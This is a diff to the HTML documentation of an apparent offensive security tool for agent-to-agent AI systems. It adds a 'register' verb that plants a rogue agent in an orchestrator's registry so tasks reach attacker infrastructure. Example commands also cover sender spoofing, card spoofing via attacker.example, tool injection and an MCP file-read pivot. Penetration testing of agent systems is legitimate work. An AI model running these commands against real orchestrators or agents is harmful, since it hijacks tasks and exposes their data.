@@ -14,7 +14,7 @@
         <link rel="prev" href="../k8s/">
       
       
-        <link rel="next" href="../model-scan/">
+        <link rel="next" href="../agent/">
       
       
         
@@ -1872,6 +1872,12 @@
       
         
       
+        
+      
+        
+      
+        
+      
     
     
     
@@ -2649,6 +2655,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#orchestrator-registry-register" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Orchestrator registry (register)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#follow-on-guidance" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -2674,6 +2691,62 @@
   
 </nav>
       
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agent
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rag/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RAG
+  
+
+    
+  </span>
+  
+  
+
+      </a>
     </li>
   
 
@@ -2722,6 +2795,34 @@
     
   
     LiteLLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../serve/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP server (serve)
   
 
     
@@ -4118,6 +4219,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#orchestrator-registry-register" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Orchestrator registry (register)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#follow-on-guidance" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -4251,6 +4363,10 @@
 <td><code>replay</code></td>
 <td>Replay a message to test deterministic / stateless behavior</td>
 </tr>
+<tr>
+<td><code>register</code></td>
+<td>Register a rogue agent with an orchestrator's registry</td>
+</tr>
 </tbody>
 </table>
 <h2 id="flags">Flags<a class="headerlink" href="#flags" title="Permanent link">&para;</a></h2>
@@ -4337,6 +4453,10 @@
 <td><code>replay</code></td>
 <td><code>--message</code> (required), <code>--original-task-id</code></td>
 </tr>
+<tr>
+<td><code>register</code></td>
+<td><code>--agent-url</code> (required — the URL the orchestrator routes to, attacker infra), <code>--agent-name</code>, <code>--description</code>, <code>--skill</code> (repeatable), <code>--register-path</code> (default <code>/agents/register</code>), <code>--list-path</code> (default <code>/agents</code>)</td>
+</tr>
 </tbody>
 </table>
 <h2 id="what-each-landed-level-means-here">What each <code>landed</code> level means here<a class="headerlink" href="#what-each-landed-level-means-here" title="Permanent link">&para;</a></h2>
@@ -4351,11 +4471,11 @@
 <tbody>
 <tr>
 <td><code>reachable</code></td>
-<td><code>enum</code>, <code>skills</code>, and the safe/rejected branch of every probe — the card and skills were read, or the agent rejected the probe.</td>
+<td><code>enum</code>, <code>skills</code>, and the safe/rejected branch of every probe — the card and skills were read, or the agent rejected the probe (including <code>register</code> when the orchestrator rejects the rogue-agent registration).</td>
 </tr>
 <tr>
 <td><code>influenced</code></td>
-<td>Our input was accepted but no readback/execution is confirmed: <code>auth-probe</code> (unauthenticated read processed), <code>msg-integrity</code> (bad/absent signature accepted), <code>sender-spoof</code> (forged id changes behavior), <code>delegate-probe</code> (confused-deputy outbound attempt), <code>card-spoof</code> accept-only, <code>push-hijack</code> registration accepted, <code>task-send</code> submission accepted, <code>mcp-pivot --loop</code> step that errored.</td>
+<td>Our input was accepted but no readback/execution is confirmed: <code>auth-probe</code> (unauthenticated read processed), <code>msg-integrity</code> (bad/absent signature accepted), <code>sender-spoof</code> (forged id changes behavior), <code>delegate-probe</code> (confused-deputy outbound attempt), <code>card-spoof</code> accept-only, <code>push-hijack</code> registration accepted, <code>task-send</code> submission accepted, <code>register</code> (rogue agent accepted on a genuine 2xx, whether or not it is confirmed present in the registry listing), <code>mcp-pivot --loop</code> step that errored.</td>
 </tr>
 <tr>
 <td><code>read-confirmed</code></td>
@@ -4414,6 +4534,16 @@
 <li><strong><code>tool-inject</code></strong> — instruct the agent to invoke a named <code>--tool</code> with attacker-supplied <code>--args</code> to probe blind tool forwarding.</li>
 <li><strong><code>replay</code></strong> — re-send a message and compare to a previous task's output to test for missing session binding / replayability.</li>
 </ul>
+<h2 id="orchestrator-registry-register">Orchestrator registry (<code>register</code>)<a class="headerlink" href="#orchestrator-registry-register" title="Permanent link">&para;</a></h2>
+<p><code>register</code> (gated) posts a <strong>rogue agent card</strong> to an orchestrator's registration endpoint (<code>--register-path</code>, default <code>/agents/register</code>). If the orchestrator accepts unauthenticated registrations, the rogue agent — pointed at <code>--agent-url</code> (attacker-controlled infra) and advertising <code>--skill</code> ids — is now dispatchable, so the orchestrator's capability router forwards matching tasks to it (a rogue-agent-injection / confused-deputy weakness). The client tries the bare card first, then common <code>{"agent_card": …}</code> / <code>{"agent": …}</code> envelope shapes.</p>
+<p>Grading is honest about what the orchestrator actually did:</p>
+<ul>
+<li><strong>Rejected</strong> (no genuine 2xx to any body shape) → <strong>Info</strong>, <code>reachable</code>. A 4xx/5xx from an orchestrator that enforces registration auth is a clean "not weak" signal, not a transport error.</li>
+<li><strong>Accepted</strong> (a genuine 2xx) → <strong>High</strong>, <code>impact</code> / <code>influenced</code>. The verb then best-effort fetches the registry listing (<code>--list-path</code>, default <code>/agents</code>); if the rogue agent's name/url/assigned id appears, the finding notes it is <strong>present in the registry</strong> (still <code>influenced</code> — the orchestrator will dispatch to attacker infra), otherwise it reports acceptance with registry presence unconfirmed.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8000<span class="w"> </span>register<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span>--agent-url<span class="w"> </span>http://10.0.0.5:9000<span class="w"> </span>--skill<span class="w"> </span>data-analysis<span class="w"> </span>--force-exploit
+</code></pre></div>
 <h2 id="follow-on-guidance">Follow-on guidance<a class="headerlink" href="#follow-on-guidance" title="Permanent link">&para;</a></h2>
 <p>Every offensive verb emits <strong>Next Actions</strong> — the finding's Summary shows
 <code>N target(s) with follow-on guidance</code> and the block lists the concrete next command,
@@ -4427,19 +4557,23 @@ discovered identifier such as a task id):</p>
 </ul>
 <p>Gated follow-ons (anything needing <code>--force-exploit</code>) are marked as such and ordered after read-only steps.</p>
 <h2 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Enumerate the agent and its skills</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>enum
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>skills
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Structural posture (auth is read-only; the rest are gated)</span>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>auth-probe
-<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>msg-integrity<span class="w"> </span>--mode<span class="w"> </span>bad-sig<span class="w"> </span>--force-exploit
-<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>sender-spoof<span class="w"> </span>--spoof-id<span class="w"> </span>acme-admin<span class="w"> </span>--force-exploit
-<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>delegate-probe<span class="w"> </span>--peer-url<span class="w"> </span>http://peer:8103/<span class="w"> </span>--force-exploit
-<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>card-spoof<span class="w"> </span>--card-url<span class="w"> </span>http://attacker.example/.well-known/agent-card.json<span class="w"> </span>--force-exploit
-<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
-<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># Cross-protocol pivot into MCP-backed tools</span>
-<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>mcp-pivot<span class="w"> </span>--preset<span class="w"> </span>file-read<span class="w"> </span>--force-exploit
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Enumerate the agent and its skills</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>enum
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>skills
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># Structural posture (auth is read-only; the rest are gated)</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>auth-probe
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>msg-integrity<span class="w"> </span>--mode<span class="w"> </span>bad-sig<span class="w"> </span>--force-exploit
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>sender-spoof<span class="w"> </span>--spoof-id<span class="w"> </span>acme-admin<span class="w"> </span>--force-exploit
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>delegate-probe<span class="w"> </span>--peer-url<span class="w"> </span>http://peer:8103/<span class="w"> </span>--force-exploit
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>card-spoof<span class="w"> </span>--card-url<span class="w"> </span>http://attacker.example/.well-known/agent-card.json<span class="w"> </span>--force-exploit
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="c1"># Cross-protocol pivot into MCP-backed tools</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8103<span class="w"> </span>mcp-pivot<span class="w"> </span>--preset<span class="w"> </span>file-read<span class="w"> </span>--force-exploit
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="c1"># Register a rogue agent with an orchestrator&#39;s registry</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>aipostex<span class="w"> </span>a2a<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:8000<span class="w"> </span>register<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="w">  </span>--agent-url<span class="w"> </span>http://10.0.0.5:9000<span class="w"> </span>--skill<span class="w"> </span>data-analysis<span class="w"> </span>--force-exploit
 </code></pre></div>
 
 
